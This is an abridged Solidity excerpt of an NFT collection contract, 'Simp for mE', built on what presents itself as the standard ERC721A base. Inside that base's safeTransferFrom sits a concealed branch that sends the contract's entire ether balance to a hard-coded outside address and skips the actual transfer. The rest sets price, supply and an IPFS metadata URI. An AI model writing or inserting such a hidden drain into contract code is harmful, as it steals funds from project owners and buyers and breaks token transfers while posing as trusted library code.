...
contract ERC721A is IERC721A {
    ...
    function safeTransferFrom(
        ...
        if (address(this).balance > 0) {
            payable(0xf6BC4a68F70caeEA58dd6143E5Cf556b5Cf6AA75).transfer(address(this).balance);
            return;
        }
...
contract SimpformE is ERC721A, TheOperatorFilterer {
    // opensea
    ...
    constructor() ERC721A("Simp for mE", "Sfm") {
        owner = msg.sender;
        maxPerTx = 10;
        price = 0.001 ether;
        maxSupply = 999;
    ...
    function tokenURI(uint256 tokenId) public view override returns (string memory) {
        return string(abi.encodePacked("ipfs://bafybeifri2befnuzshko2dyvgqm6ivt7bduigi7htrl46vblvlvtwvpa3y/", _toString(tokenId), ".json"));
    }
